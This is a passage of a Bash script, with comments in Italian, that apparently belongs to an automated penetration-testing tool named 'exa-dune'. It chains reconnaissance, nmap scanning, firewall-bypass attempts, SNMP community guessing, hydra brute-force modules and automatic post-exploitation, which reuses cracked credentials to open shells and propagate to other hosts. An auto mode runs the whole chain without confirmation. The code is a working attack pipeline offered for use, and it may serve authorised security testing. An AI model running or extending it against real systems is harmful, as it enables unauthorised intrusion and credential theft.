        if [[ $DRY_RUN -eq 1 ]]; then
            # In dry-run senza nmap file: popola con piano demo per mostrare tutte le fasi
            attack_plan=(
                "1|sip|$target|SIP esposto: enumerazione estensioni e crack PIN"
                "5|ssh|$target|SSH: brute force credenziali"
                "8|web|$target|HTTP: directory fuzzing e nikto"
                "9|snmp|$target|SNMP: community brute force"
            )
            log "[DRY-RUN] Nessun file nmap trovato — uso piano attacchi demo per simulazione"
        else
            warn "Nessuna porta riconosciuta — pipeline interrotta dopo scan"
            bash "$SCRIPT_PATH" report "$OUTDIR_BASE" --html --pdf --output "$OUTDIR_BASE" 2>/dev/null || true
            exit 0
        fi
    fi

    _print_suggestions "$nmap_out" "$target"
    _timeline_event "FASE 2 END — ${#attack_plan[@]} attacchi pianificati"

    # ── CONFERMA O AUTO ──────────────────────────────────────
    if [[ $auto_mode -eq 0 && $DRY_RUN -eq 0 ]]; then
        echo ""
        read -r -p "$(echo -e "${YELLOW}[?]${NC} Procedere con gli attacchi suggeriti? [S/n] ")" ans || ans="s"
        [[ "${ans,,}" == "n" ]] && { warn "Pipeline interrotta dall'utente."; exit 0; }
    fi

    # ── FASE 3: ESECUZIONE ATTACCHI ─────────────────────────
    section "FASE 3 — ESECUZIONE ATTACCHI"
    _timeline_event "FASE 3 START — esecuzione ${#attack_plan[@]} moduli (parallel=${parallel_mode})"
    local found_creds=0
    local modules_run=()
    local _bg_pids=()

    # Helper per eseguire un modulo (sequenziale o background)
    _run_module() {
        local module="$1"; shift
        local args="$*"
        local mod_flags="--output $OUTDIR_BASE"
        [[ $STEALTH -eq 1 ]] && mod_flags="$mod_flags --stealth"
        [[ $DRY_RUN -eq 1 ]] && mod_flags="$mod_flags --dry-run"
        # --timeout non passato ai sotto-moduli: non tutti lo accettano
        [[ -n "$CUSTOM_USERS" ]] && mod_flags="$mod_flags --userlist $CUSTOM_USERS"
        [[ -n "$CUSTOM_PASS"  ]] && mod_flags="$mod_flags --passlist $CUSTOM_PASS"
        _timeline_event "  MOD START — $module $args"
        local t0; t0=$(date +%s)
        bash "$SCRIPT_PATH" $module $args $mod_flags 2>&1 || true
        local t1; t1=$(date +%s)
        _timeline_event "  MOD END   — $module [$(( t1 - t0 ))s]"
    }

    if [[ $parallel_mode -eq 1 && $DRY_RUN -eq 0 ]]; then
        # Modalità parallela: lancia tutti in background, poi aspetta
        log "[PARALLEL] Lancio tutti i moduli in background..."
        for entry in "${attack_plan[@]}"; do
            IFS='|' read -r prio module args reason <<< "$entry"
            log "  [bg] $module — $reason"
            modules_run+=("$module")
            _run_module "$module" $args &
            _bg_pids+=($!)
        done
        log "[PARALLEL] In attesa completamento ${#_bg_pids[@]} moduli..."
        for pid in "${_bg_pids[@]}"; do
            wait "$pid" 2>/dev/null || true
        done
        ok "[PARALLEL] Tutti i moduli completati."
    else
        # Modalità sequenziale (default)
        for entry in "${attack_plan[@]}"; do
            IFS='|' read -r prio module args reason <<< "$entry"
            section "  [$module] $reason"
            log "Esecuzione: exa-dune $module $args"
            modules_run+=("$module")
            _run_module "$module" $args

            # Controlla se sono state trovate credenziali dopo ogni modulo
            if [[ $DRY_RUN -eq 0 ]] && \
               find "$OUTDIR_BASE" -name "hydra_*.txt" -newer "$OUTDIR_BASE/pipeline.log" \
                    -exec grep -l "login:" {} \; 2>/dev/null | grep -q .; then
                found_creds=1
                ok "Credenziali trovate durante modulo '$module'!"
            fi

            # Fine fase — messaggio se nulla trovato
            if [[ $DRY_RUN -eq 0 ]]; then
                local mod_findings
                mod_findings=$(find "$OUTDIR_BASE" -path "*/${module}*/findings.txt" 2>/dev/null | head -1)
                if [[ -n "$mod_findings" && -s "$mod_findings" ]]; then
                    local count; count=$(wc -l < "$mod_findings" 2>/dev/null || echo 0)
                    ok "[$module] $count finding(s) registrati"
                else
                    log "[$module] Nessuna vulnerabilità rilevata — fase completata."
                fi
            fi
        done
    fi

    # Check credenziali dopo tutto (in parallel mode controlliamo qui)
    if [[ $DRY_RUN -eq 0 ]] && find "$OUTDIR_BASE" -name "hydra_*.txt" \
         -exec grep -l "login:" {} \; 2>/dev/null | grep -q .; then
        found_creds=1
    fi
    _timeline_event "FASE 3 END — found_creds=${found_creds}"

    # ── FASE 4: POST-EXPLOITATION ────────────────────────────
    if [[ $no_post -eq 0 && $found_creds -eq 1 ]]; then
        section "FASE 4 — POST-EXPLOITATION (credenziali trovate)"
        _timeline_event "FASE 4 START — post-exploitation"
        # Leggi le credenziali trovate da hydra
        while IFS= read -r -d '' hfile; do
            local cred_user cred_pass cred_port
            cred_user=$(grep "login:" "$hfile" 2>/dev/null | head -1 | grep -oP "login: \K\S+")
            cred_pass=$(grep "login:" "$hfile" 2>/dev/null | head -1 | grep -oP "password: \K\S+")
            cred_port=$(grep "login:" "$hfile" 2>/dev/null | head -1 | grep -oP "port \K[0-9]+" || echo "22")
            local proto="ssh"
            echo "$hfile" | grep -qi "ftp"    && proto="ftp"
            echo "$hfile" | grep -qi "telnet" && proto="telnet"
            echo "$hfile" | grep -qi "smb"    && proto="smb"

            if [[ -n "$cred_user" && -n "$cred_pass" ]]; then
                log "Post-exploit via $proto: $cred_user:$cred_pass"
                local post_flags="--output $OUTDIR_BASE"
                [[ $DRY_RUN -eq 1 ]] && post_flags="$post_flags --dry-run"
                bash "$SCRIPT_PATH" post "$target" shell \
                    --proto "$proto" --user "$cred_user" --pass "$cred_pass" \
                    --port "$cred_port" $post_flags 2>&1 || true
            fi
        done < <(find "$OUTDIR_BASE" -name "hydra_*.txt" -print0 2>/dev/null)
    elif [[ $no_post -eq 0 && $found_creds -eq 0 && $DRY_RUN -eq 0 ]]; then
        log "Fase 4 POST-EXPLOITATION: nessuna credenziale confermata — step saltato."
        _timeline_event "FASE 4 SKIP — nessuna credenziale"
    fi

    # Propagazione finale credenziali
    if [[ "${PROPAGATE_CREDS:-0}" -eq 1 && $DRY_RUN -eq 0 ]]; then
        _cred_propagate "$target"
    fi
    _cred_store_summary

    # ── FASE 5: REPORT PDF ───────────────────────────────────
    section "FASE 5 — GENERAZIONE REPORT PDF"
    _timeline_event "FASE 5 START — generazione report"
    local report_flags="--html --pdf"
    [[ $DRY_RUN -eq 1 ]] && report_flags="$report_flags --dry-run"
    bash "$SCRIPT_PATH" report "$OUTDIR_BASE" $report_flags 2>&1 || true
    _timeline_event "FASE 5 END — pipeline completata"

    echo ""
    local total_findings; total_findings=$(find "$OUTDIR_BASE" -name 'findings.txt' -exec wc -l {} \; 2>/dev/null | awk '{s+=$1} END{print s+0}')
    local total_creds; total_creds=$(find "$OUTDIR_BASE" -name "hydra_*.txt" -exec grep -c "login:" {} \; 2>/dev/null | awk '{s+=$1} END{print s+0}' || echo 0)
    ok "=== PIPELINE COMPLETATA === Output: $OUTDIR_BASE"
    echo -e "  ${BOLD}Report:${NC}     $OUTDIR_BASE/REPORT_*.pdf"
    echo -e "  ${BOLD}Findings:${NC}   $total_findings totali"
    echo -e "  ${BOLD}Credenziali:${NC} $total_creds trovate"
    echo -e "  ${BOLD}Timeline:${NC}   $OUTDIR_BASE/timeline.txt"
    [[ -f "$_timeline_file" ]] && { echo ""; echo "── Timeline ──"; cat "$_timeline_file"; }
}

# ============================================================
#  SUBCOMMAND: auto
# ============================================================
usage_auto() {
    echo "Uso: exa-dune auto <TARGET> [OPTIONS]"
    echo ""
    echo "  Assessment completo a 4 fasi, tutto visibile in un terminale:"
    echo "    FASE 1 — SCAN        port scan + service detection"
    echo "    FASE 2 — ENUM        moduli scelti dalle porte trovate"
    echo "    FASE 3 — ATTACCHI    brute-force + CVE basati sui findings"
    echo "    FASE 4 — REPORT PDF  generato e salvato su Desktop"
    echo ""
    echo "Opzioni:"
    echo "  --stealth"
    echo "  --timeout N        Timeout minuti per modulo"
    echo "  --userlist FILE"
    echo "  --passlist FILE"
    echo "  --output DIR"
    echo "  --dry-run"
    echo "  --resume DIR       Riprende da un output dir esistente (salta le operazioni già completate)"
}

cmd_auto() {
    local target="" _RESUME=0
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --stealth)   STEALTH=1;                                              shift ;;
            --timeout)   _req_arg "$1" "${2:-}"; TIMEOUT="$2";                  shift 2 ;;
            --userlist)  _req_arg "$1" "${2:-}"; CUSTOM_USERS="$2";             shift 2 ;;
            --passlist)  _req_arg "$1" "${2:-}"; CUSTOM_PASS="$2";              shift 2 ;;
            --output)    _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2";              shift 2 ;;
            --resume)    _req_arg "$1" "${2:-}"; OUTDIR_BASE="$2"; _RESUME=1;   shift 2 ;;
            --dry-run)   DRY_RUN=1;                                              shift ;;
            --help|-h)   usage_auto; exit 0 ;;
            -*)          err "Opzione sconosciuta: $1"; usage_auto; exit 1 ;;
            *)           target="$1"; shift ;;
        esac
    done
    [[ -z "$target" ]] && { err "TARGET mancante"; usage_auto; exit 1; }
    validate_target "$target"
    check_root
    apply_stealth

    local base_ts; base_ts=$(date +%Y%m%d_%H%M%S)
    local _auto_start_ts; _auto_start_ts=$(date +%s)
    OUTDIR_BASE="${OUTDIR_BASE:-/root/pentest/exa-dune-${target//./-}_${base_ts}}"
    [[ $DRY_RUN -eq 0 ]] && mkdir -p "$OUTDIR_BASE"
    OUTDIR="$OUTDIR_BASE"
    [[ $DRY_RUN -eq 0 ]] && _log_file="$OUTDIR_BASE/master.log" || _log_file=""

    # ── Checkpoint + progress ─────────────────────────────────────
    local _ckpt_file="" _mod_done=0 _phase_num=0
    if [[ $DRY_RUN -eq 0 ]]; then
        _ckpt_file="$OUTDIR_BASE/.exa_checkpoint"
        touch "$_ckpt_file" 2>/dev/null || true
        if [[ $_RESUME -eq 1 ]]; then
            [[ -f "$_ckpt_file" ]] || { err "Checkpoint non trovato in $OUTDIR_BASE"; exit 1; }
            ok "Resume da checkpoint: $(grep -c '' "$_ckpt_file" 2>/dev/null || echo 0) operazioni già completate"
        fi
    fi
    _ckpt_done() { [[ -n "$_ckpt_file" ]] && echo "$1" >> "$_ckpt_file" 2>/dev/null || true; }
    _ckpt_skip() { [[ -n "$_ckpt_file" ]] && grep -qxF "$1" "$_ckpt_file" 2>/dev/null; }

    # Flag comuni per tutti i sotto-moduli
    # NOTA: --timeout NON viene passato ai sotto-moduli perché la maggior parte non lo accetta;
    # il timeout è già gestito dal wrapper `timeout $s exa-dune ...` dentro _run_mod.
    local common_flags=""
    [[ $DRY_RUN -eq 1 ]]           && common_flags="--dry-run"
    [[ $STEALTH -eq 1 ]]           && common_flags="$common_flags --stealth"
    [[ -n "${CUSTOM_USERS:-}" ]]   && common_flags="$common_flags --userlist $CUSTOM_USERS"
    [[ -n "${CUSTOM_PASS:-}" ]]    && common_flags="$common_flags --passlist $CUSTOM_PASS"

    # Helper: esegue un modulo con output visibile in tempo reale
    _run_mod() {
        local label="$1"; shift
        # Checkpoint: salta se già completato in una sessione precedente
        if _ckpt_skip "mod:$label"; then
            echo -e "  ${CYAN}↷${NC} [${_phase_num}/4] $label ${CYAN}(skip)${NC}"
            return 0
        fi
        (( _mod_done++ )) || true
        (( _DONE_MODS++ )) || true
        local _ts0; _ts0=$(date +%s)
        local _mod_t=$(( TIMEOUT > 0 ? TIMEOUT : 60 ))
        local _mod_timeout_s=$(( _mod_t * 60 ))
        echo -e "\n  ${BOLD}${CYAN}[Fase ${_phase_num}/4 | #${_mod_done}]${NC} ${BOLD}▶ ${label}${NC} ${CYAN}(max ${_mod_t}m)${NC}"
        [[ $_TOTAL_MODS -gt 0 ]] && _progress_bar "$_DONE_MODS" "$_TOTAL_MODS" "$label"
        if [[ $DRY_RUN -eq 0 ]]; then
            # shellcheck disable=SC2086
            if timeout "$_mod_timeout_s" exa-dune "$@" $common_flags --output "$OUTDIR_BASE"; then
                local _el=$(( $(date +%s) - _ts0 ))
                ok "  ✔ $label completato (${_el}s)"
            else
                local _ec=$? _el=$(( $(date +%s) - _ts0 ))
                if [[ $_ec -eq 124 ]]; then
                    warn "  ⚠ $label: timeout dopo ${_mod_t}m — risultati parziali salvati"
                else
                    warn "  ⚠ $label: terminato con errore (exit $_ec, ${_el}s)"
                fi
            fi
            _ckpt_done "mod:$label"
        else
            echo -e "${CYAN}[DRY-RUN]${NC} timeout ${_mod_timeout_s}s exa-dune $* $common_flags --output $OUTDIR_BASE"
        fi
    }

    # ─────────────────────────────────────────────────────────
    # FASE 1 — SCAN
    # ─────────────────────────────────────────────────────────
    _phase_num=1
    echo ""
    echo -e "${BOLD}${CYAN}══════════════════════════════════════════${NC}"
    echo -e "${BOLD}${CYAN}  FASE 1 — SCAN                           ${NC}"
    echo -e "${BOLD}${CYAN}══════════════════════════════════════════${NC}"
    log "Target: $target | Output: $OUTDIR_BASE"

    local prescan_dir="$OUTDIR_BASE/prescan"
    [[ $DRY_RUN -eq 0 ]] && mkdir -p "$prescan_dir"

    # ── PRE-SCAN: ricognizione veloce ────────────────────────

    # 1. DNS reverse lookup
    log "▶ [pre-scan] DNS reverse lookup..."
    local dns_hostname=""
    if [[ $DRY_RUN -eq 0 ]]; then
        dns_hostname=$(dig +short -x "$target" 2>/dev/null | sed 's/\.$//' | head -1 || true)
        [[ -z "$dns_hostname" ]] && \
            dns_hostname=$(host "$target" 2>/dev/null | grep -oP 'pointer \K\S+' | sed 's/\.$//' | head -1 || true)
        if [[ -n "$dns_hostname" ]]; then
            log "  Hostname: $dns_hostname"
            echo "hostname=$dns_hostname" > "$prescan_dir/dns.txt"
        else
            log "  Nessun PTR record trovato"
        fi
    else
        echo -e "${CYAN}[DRY-RUN]${NC} dig +short -x $target"
    fi

    # 2. Passive ARP sniff — aspetta che il device si annunci sulla rete (stealthy, 10s)
    log "▶ [pre-scan] Passive ARP sniff (10s)..."
    if [[ $DRY_RUN -eq 0 ]]; then
        if command -v tcpdump &>/dev/null; then
            local _iface; _iface=$(ip route get "$target" 2>/dev/null | awk '/dev/{print $5; exit}' || echo eth0)
            timeout 10 tcpdump -i "$_iface" -nn -e \
                "arp and (src host $target or dst host $target)" \
                2>/dev/null > "$prescan_dir/arp_passive.txt" || true
            local _pmac
            _pmac=$(grep -oP '[0-9a-f]{2}(:[0-9a-f]{2}){5}' "$prescan_dir/arp_passive.txt" \
                    2>/dev/null | head -1 || true)
            if [[ -n "$_pmac" ]]; then
                log "  ARP passivo: MAC rilevato → $_pmac"
            else
                log "  ARP passivo: nessuna trama ARP catturata"
            fi
        else
            warn "  tcpdump non trovato — passive ARP sniff saltato"
        fi
    else
        echo -e "${CYAN}[DRY-RUN]${NC} tcpdump -i <iface> arp and src/dst $target (10s)"
    fi

    # 3. ICMP check — decide se usare -Pn nello scan
    log "▶ [pre-scan] ICMP ping check..."
    local nmap_ping_flag=""
    if [[ $DRY_RUN -eq 0 ]]; then
        if ping -c 2 -W 2 "$target" &>/dev/null; then
            log "  ICMP: risponde al ping"
        else
            warn "  ICMP: nessuna risposta — scan con -Pn (no ping)"
            nmap_ping_flag="--no-ping"
            echo "icmp=blocked" > "$prescan_dir/icmp.txt"
        fi
    else
        echo -e "${CYAN}[DRY-RUN]${NC} ping -c 2 -W 2 $target"
    fi

    # 4. Traceroute — rileva hop, NAT e firewall intermedi
    log "▶ [pre-scan] Traceroute..."
    if [[ $DRY_RUN -eq 0 ]]; then
        if command -v traceroute &>/dev/null; then
            timeout 20 traceroute -n -w 2 -q 1 "$target" \
                > "$prescan_dir/traceroute.txt" 2>&1 || true
            local _hops
            _hops=$(grep -c '^\s*[0-9]' "$prescan_dir/traceroute.txt" 2>/dev/null || echo 0)
            local _last_hop
            _last_hop=$(grep -oP '^\s*\d+\s+\K[\d.]+' "$prescan_dir/traceroute.txt" \
                        2>/dev/null | tail -1 || true)
            log "  Hop count: $_hops | Ultimo hop: ${_last_hop:-(timeout)}"
            # Se l'ultimo hop non è il target → probabilmente c'è un FW/NAT davanti
            [[ -n "$_last_hop" && "$_last_hop" != "$target" ]] && \
                warn "  Ultimo hop ($_last_hop) ≠ target — possibile firewall/NAT intermedio"
        else
            warn "  traceroute non trovato — saltato (apt install traceroute)"
        fi
    else
        echo -e "${CYAN}[DRY-RUN]${NC} traceroute -n -w 2 -q 1 $target"
    fi

    # 5. mDNS probe (UDP 5353) — dispositivi IoT si annunciano da soli
    log "▶ [pre-scan] mDNS discovery (UDP 5353)..."
    if [[ $DRY_RUN -eq 0 ]]; then
        # shellcheck disable=SC2086
        exa-dune mdns "$target" $common_flags --output "$OUTDIR_BASE" 2>/dev/null || true
    else
        echo -e "${CYAN}[DRY-RUN]${NC} mdns $target"
    fi

    # 6. WS-Discovery probe (UDP 3702) — telecamere e dispositivi embedded
    log "▶ [pre-scan] WS-Discovery probe (UDP 3702)..."
    if [[ $DRY_RUN -eq 0 ]]; then
        # shellcheck disable=SC2086
        exa-dune wsd "$target" $common_flags --output "$OUTDIR_BASE" 2>/dev/null || true
    else
        echo -e "${CYAN}[DRY-RUN]${NC} wsd $target"
    fi

    # 7. SNMP quick probe — community string public/private su UDP 161
    log "▶ [pre-scan] SNMP quick probe (public / private / community / admin)..."
    if [[ $DRY_RUN -eq 0 ]]; then
        if command -v snmpget &>/dev/null; then
            for _comm in public private community admin; do
                local _snmp_out
                _snmp_out=$(timeout 3 snmpget -v1 -c "$_comm" -r 1 -t 2 \
                                "$target" sysDescr.0 2>/dev/null || true)
                if [[ -n "$_snmp_out" && "$_snmp_out" != *"No Such"* \
                                      && "$_snmp_out" != *"Timeout"* \
                                      && "$_snmp_out" != *"No Response"* ]]; then
                    log "  SNMP community '$_comm' → $(echo "$_snmp_out" | head -c 80)"
                    echo "community=$_comm" >> "$prescan_dir/snmp_quick.txt"
                    echo "sysDescr=$_snmp_out" >> "$prescan_dir/snmp_quick.txt"
                    break
                fi
            done
            [[ ! -s "$prescan_dir/snmp_quick.txt" ]] && \
                log "  SNMP: nessuna community standard risponde"
        else
            warn "  snmpget non trovato — SNMP quick probe saltato (apt install snmp)"
        fi
    else
        echo -e "${CYAN}[DRY-RUN]${NC} snmpget -v1 -c public/private/community/admin $target sysDescr.0"
    fi

    # 8. HTTP HEAD rapido — Server header rivela spesso tipo/modello device
    log "▶ [pre-scan] HTTP HEAD (80 / 443 / 8080 / 8443)..."
    if [[ $DRY_RUN -eq 0 ]]; then
        {
            for _port in 80 8080; do
                local _hdr
                _hdr=$(curl -sI --connect-timeout 3 --max-time 5 \
                    "http://$target:$_port/" 2>/dev/null | head -15 || true)
                if [[ -n "$_hdr" ]]; then
                    echo "=== HTTP :$_port ==="
                    echo "$_hdr"
                    local _srv; _srv=$(echo "$_hdr" | grep -i "^Server:" | head -1 || true)
                    [[ -n "$_srv" ]] && log "  HTTP:$_port → $_srv"
                fi
            done
            for _port in 443 8443; do
                local _hdr
                _hdr=$(curl -skI --connect-timeout 3 --max-time 5 \
                    "https://$target:$_port/" 2>/dev/null | head -15 || true)
                if [[ -n "$_hdr" ]]; then
                    echo "=== HTTPS :$_port ==="
                    echo "$_hdr"
                    local _srv; _srv=$(echo "$_hdr" | grep -i "^Server:" | head -1 || true)
                    [[ -n "$_srv" ]] && log "  HTTPS:$_port → $_srv"
                fi
            done
        } > "$prescan_dir/http_head.txt" 2>/dev/null || true
    else
        echo -e "${CYAN}[DRY-RUN]${NC} curl -sI http(s)://$target:{80,443,8080,8443}/"
    fi

    # 6. SSL certificate grab — CN/SAN/O spesso contengono modello e vendor
    log "▶ [pre-scan] SSL certificate grab (:443)..."
    if [[ $DRY_RUN -eq 0 ]]; then
        local _cert
        _cert=$(echo | timeout 5 openssl s_client -connect "$target":443 \
                    -servername "$target" 2>/dev/null \
                | openssl x509 -noout -subject -issuer -dates 2>/dev/null || true)
        if [[ -n "$_cert" ]]; then
            echo "$_cert" > "$prescan_dir/ssl_cert.txt"
            log "  Cert: $(echo "$_cert" | grep -i "subject" | head -1)"
        else
            log "  SSL :443 non raggiungibile in pre-scan"
        fi
    else
        echo -e "${CYAN}[DRY-RUN]${NC} openssl s_client -connect $target:443"
    fi

    # ── SUB-CASO 1: scan completo ────────────────────────────
    if _ckpt_skip "op:scan"; then
        log "↷ Scan completo (skip — checkpoint)"
    else
        log "▶ Scan completo (nmap fast + full + UDP + ARP + searchsploit)..."
        if [[ $DRY_RUN -eq 0 ]]; then
            # Se ICMP bloccato, inietta -Pn tramite NMAP_TIMING override
            [[ -n "$nmap_ping_flag" ]] && export NMAP_OPTS_EXTRA="-Pn" || true
            # shellcheck disable=SC2086
            exa-dune scan "$target" $common_flags --output "$OUTDIR_BASE"
            unset NMAP_OPTS_EXTRA
            _ckpt_done "op:scan"
        else
            echo -e "${CYAN}[DRY-RUN]${NC} scan $target${nmap_ping_flag:+ (con -Pn)}"
        fi
    fi

    # Estrai porte aperte TCP e UDP dai file gnmap prodotti dal scan
    local scan_dir="$OUTDIR_BASE/scan"
    local open_tcp="" open_udp=""
    if [[ $DRY_RUN -eq 0 ]]; then
        local gnmap_tcp; gnmap_tcp=$(find "$scan_dir" -name "nmap_fast.gnmap" 2>/dev/null | head -1)
        [[ -n "$gnmap_tcp" ]] && \
            open_tcp=$(grep -oP '[0-9]+/open/tcp' "$gnmap_tcp" 2>/dev/null \
                       | grep -oP '^[0-9]+' | tr '\n' ' ' || true)
        local gnmap_udp; gnmap_udp=$(find "$scan_dir" -name "nmap_udp.gnmap" 2>/dev/null | head -1)
        [[ -n "$gnmap_udp" ]] && \
            open_udp=$(grep -oP '[0-9]+/open[|]filtered/udp' "$gnmap_udp" 2>/dev/null \
                       | grep -oP '^[0-9]+' | tr '\n' ' ' || true)
    fi
    log "TCP aperte : ${open_tcp:-(nessuna rilevata)}"
    log "UDP aperte : ${open_udp:-(nessuna rilevata)}"

    # Restituisce 0 se la porta è aperta (TCP o UDP)
    _port_open() { echo " $open_tcp $open_udp " | grep -qw "$1"; }
    _ls_count()  { local _d="$1" _g="${2:-*}"; ls "$_d"/$_g 2>/dev/null | wc -l || echo 0; }

    # 7. MAC → vendor lookup (da ARP scan già eseguito in cmd_scan)
    log "▶ [post-scan] MAC/vendor lookup..."
    local mac_vendor=""
    if [[ $DRY_RUN -eq 0 && -f "$scan_dir/arp.txt" ]]; then
        # arp-scan output: IP\tMAC\tVendor
        mac_vendor=$(grep -oP '\t[0-9A-Fa-f:]{17}\t\K.+' "$scan_dir/arp.txt" 2>/dev/null \
                     | head -1 | tr -d '\r' || true)
        local mac_addr
        mac_addr=$(grep -oP '[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}' "$scan_dir/arp.txt" \
                   2>/dev/null | head -1 || true)
        if [[ -n "$mac_vendor" ]]; then
            log "  MAC: $mac_addr | Vendor: $mac_vendor"
            echo "mac=$mac_addr" > "$prescan_dir/mac.txt"
            echo "vendor=$mac_vendor" >> "$prescan_dir/mac.txt"
        else
            log "  MAC/vendor non rilevati (ARP fuori subnet o dispositivo non risponde)"
        fi
    fi

    # ── Verifica se lo scan + pre-scan hanno trovato punti deboli ──
    local scan_has_info=0
    if [[ $DRY_RUN -eq 0 ]]; then
        # Porte aperte TCP/UDP
        [[ -n "$open_tcp" || -n "$open_udp" ]] && scan_has_info=1
        # MAC/vendor rilevato
        [[ $scan_has_info -eq 0 && -n "$mac_vendor" ]] && scan_has_info=1
        # Hostname DNS
        [[ $scan_has_info -eq 0 && -n "$dns_hostname" ]] && scan_has_info=1
        # HTTP HEAD ha risposto su qualche porta
        [[ $scan_has_info -eq 0 ]] && \
            grep -qs "HTTP/" "$prescan_dir/http_head.txt" 2>/dev/null && scan_has_info=1
        # SSL cert trovato
        [[ $scan_has_info -eq 0 && -s "$prescan_dir/ssl_cert.txt" ]] && scan_has_info=1
        # mDNS o WSD hanno trovato servizi
        [[ $scan_has_info -eq 0 ]] && \
            [[ -s "$OUTDIR_BASE/mdns/findings.txt" || -s "$OUTDIR_BASE/wsd/findings.txt" ]] && \
            scan_has_info=1
        # SNMP quick probe ha risposto
        [[ $scan_has_info -eq 0 && -s "$prescan_dir/snmp_quick.txt" ]] && scan_has_info=1
        # ARP passivo ha catturato il MAC
        [[ $scan_has_info -eq 0 ]] && \
            grep -qs '[0-9a-f]\{2\}:[0-9a-f]\{2\}' "$prescan_dir/arp_passive.txt" 2>/dev/null && \
            scan_has_info=1
        # Traceroute ha raggiunto il target (almeno un hop risponde)
        [[ $scan_has_info -eq 0 ]] && \
            grep -qs "$target" "$prescan_dir/traceroute.txt" 2>/dev/null && scan_has_info=1
        # Searchsploit con match reali
        [[ $scan_has_info -eq 0 ]] && \
            grep -qvP '^\s*(-{5,}|Exploits:|ShellCodes:|No Results)' \
                "$scan_dir/searchsploit.txt" 2>/dev/null && scan_has_info=1
        # Qualsiasi finding loggato
        [[ $scan_has_info -eq 0 && -s "$scan_dir/findings.txt" ]] && scan_has_info=1
    else
        scan_has_info=1  # in dry-run prosegui sempre
    fi

    if [[ $scan_has_info -eq 1 ]]; then
        ok "Scan: punti deboli rilevati → procedo con l'enumerazione"
    else
        # ── SUB-CASO 2: nessun risultato → verifica firewall ─
        warn "Scan: nessun punto debole rilevato — verifico presenza di un firewall..."
        log "▶ Firewall detection + bypass (tutte le tecniche)..."

        # Passa la community SNMP trovata nel pre-scan a cmd_fw
        local _fw_snmp_flag=""
        if [[ $DRY_RUN -eq 0 && -s "$prescan_dir/snmp_quick.txt" ]]; then
            local _known_comm
            _known_comm=$(grep -oP '(?<=community=)\S+' "$prescan_dir/snmp_quick.txt" 2>/dev/null | head -1 || true)
            [[ -n "$_known_comm" ]] && _fw_snmp_flag="--snmp-community $_known_comm"
        fi

        if [[ $DRY_RUN -eq 0 ]]; then
            # shellcheck disable=SC2086
            exa-dune fw "$target" $common_flags $_fw_snmp_flag --output "$OUTDIR_BASE"
        else
            echo -e "${CYAN}[DRY-RUN]${NC} fw $target --tech all"
        fi

        # Controlla se il bypass ha sbloccato qualcosa
        local fw_bypass_log="$OUTDIR_BASE/fw/fw_bypass.txt"
        local bypass_ok=0
        if [[ $DRY_RUN -eq 0 && -s "$fw_bypass_log" ]]; then
            local bypass_ports
            bypass_ports=$(grep -oP '^[0-9]+' "$fw_bypass_log" 2>/dev/null | tr '\n' ' ' || true)
            [[ -n "$bypass_ports" ]] && bypass_ok=1
            # Aggiungi le porte bypassate a open_tcp per le fasi successive
            open_tcp="$open_tcp $bypass_ports"
            ok "Firewall bypassato — porte raggiunte: $bypass_ports"
        fi
        # Aggiungi anche eventuali IP extra trovati da SNMP recon
        local _snmp_extra_ips=""
        if [[ $DRY_RUN -eq 0 && -s "$OUTDIR_BASE/fw/snmp_extra_ips.txt" ]]; then
            _snmp_extra_ips=$(cat "$OUTDIR_BASE/fw/snmp_extra_ips.txt" 2>/dev/null || true)
            [[ -n "$_snmp_extra_ips" ]] && \
                warn "SNMP ha rilevato IP aggiuntivi: $_snmp_extra_ips — considera scan su questi target"
        fi

        if [[ $bypass_ok -eq 1 ]]; then
            ok "Bypass riuscito → service detection sulle porte bypassate..."
            # ── Service detection mirata sulle porte bypassate ───
            if [[ $DRY_RUN -eq 0 && -n "$bypass_ports" ]]; then
                local _bp_csv; _bp_csv="${bypass_ports// /,}"
                _bp_csv="${_bp_csv//,,/,}"; _bp_csv="${_bp_csv#,}"; _bp_csv="${_bp_csv%,}"
                if [[ -n "$_bp_csv" ]]; then
                    log "▶ nmap -sV sulle porte bypassate: $_bp_csv"
                    local _bp_svc_dir="$OUTDIR_BASE/fw/bypass_svcdet"
                    mkdir -p "$_bp_svc_dir"
                    nmap -sV --version-intensity 5 -p "$_bp_csv" "$NMAP_TIMING" \
                        -oN "$_bp_svc_dir/svcdet.nmap" \
                        -oG "$_bp_svc_dir/svcdet.gnmap" \
                        "$target" 2>/dev/null || true
                    if [[ -f "$_bp_svc_dir/svcdet.nmap" ]]; then
                        # Estrai i servizi trovati e loggali
                        local _svc_hits
                        _svc_hits=$(grep -E "^[0-9]+/tcp.*open" "$_bp_svc_dir/svcdet.nmap" 2>/dev/null || true)
                        if [[ -n "$_svc_hits" ]]; then
                            ok "Servizi trovati sulle porte bypassate:"
                            echo "$_svc_hits" | while IFS= read -r _line; do
                                echo -e "    ${GREEN}▸${NC} $_line"
                            done
                            # Aggiunge ai findings globali
                            {
                                echo "=== SERVICE DETECTION POST-BYPASS ==="
                                echo "$_svc_hits"
                            } >> "$OUTDIR_BASE/findings.txt" 2>/dev/null || true
                        fi
                    fi
                fi
            fi
            scan_has_info=1
        else
            # ── SUB-CASO 3: bypass fallito → salta a FASE 4 ──
            warn "Bypass firewall fallito — nessun punto di accesso trovato"
            log "Approcci tentati: scan completo (nmap SYN/UDP/full), ARP, searchsploit, fw bypass (ACK/FIN/Xmas/NULL/frag/srcport/decoy/TTL/slowscan/UPnP/SIP-ALG/IPv6/port-knock/IoT-ports/SNMP/full-65535)"

            # Scrivi un sommario degli approcci per il report
            {
                echo "TARGET: $target"
                echo "DATA:   $(date)"
                echo ""
                echo "APPROCCI TENTATI (nessuno ha prodotto risultati):"
                echo "  PRE-SCAN:"
                echo "    1.  Passive ARP sniff (tcpdump 10s — rileva MAC senza inviare pacchetti)"
                echo "    2.  DNS reverse lookup (PTR record)"
                echo "    3.  ICMP ping check (con fallback -Pn se bloccato)"
                echo "    4.  Traceroute (hop count, NAT/FW detection)"
                echo "    5.  mDNS discovery (UDP 5353 — avahi/nmap dns-service-discovery)"
                echo "    6.  WS-Discovery probe (UDP 3702 — telecamere/embedded)"
                echo "    7.  SNMP quick probe (community: public/private/community/admin)"
                echo "    8.  HTTP HEAD :80/:443/:8080/:8443 (Server header)"
                echo "    9.  SSL certificate grab :443 (CN/SAN/O)"
                echo "  SCAN ATTIVO:"
                echo "   10.  nmap SYN fast scan (top 1000 porte TCP)"
                echo "   11.  nmap full scan (-p- tutte le porte TCP)"
                echo "   12.  nmap UDP scan (top 20)"
